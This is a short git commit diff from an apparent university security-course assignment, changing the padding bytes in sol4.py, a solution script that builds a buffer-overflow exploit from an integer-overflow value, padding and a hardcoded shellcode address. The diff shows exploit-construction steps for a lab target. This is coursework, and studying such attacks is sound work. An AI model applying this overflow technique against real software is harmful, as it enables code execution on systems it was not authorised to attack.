f38e846fe7938c2c6e7a6e50de1ad2f211b59ecc
eecs388 <adwisi@umich.edu>
2024-11-15 19:44:44 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol4.py
+++ sol4.py
@@ -7,7 +7,7 @@ from shellcode import shellcode
 #use int overflow to get a big value. Func will read and continue reading if 64 * 4 (size of u_int)
 overflow_val = 0x8000000000000001.to_bytes(8, 'little')
 #after val, put shellcode into registers in memory - locate these after using shellcode memory location
-pad = b'\x00'*18
+pad = b'A'*18
 #shellcode location:
 shellcode_loc = 0x7ffffff68f90.to_bytes(8, 'little')
 
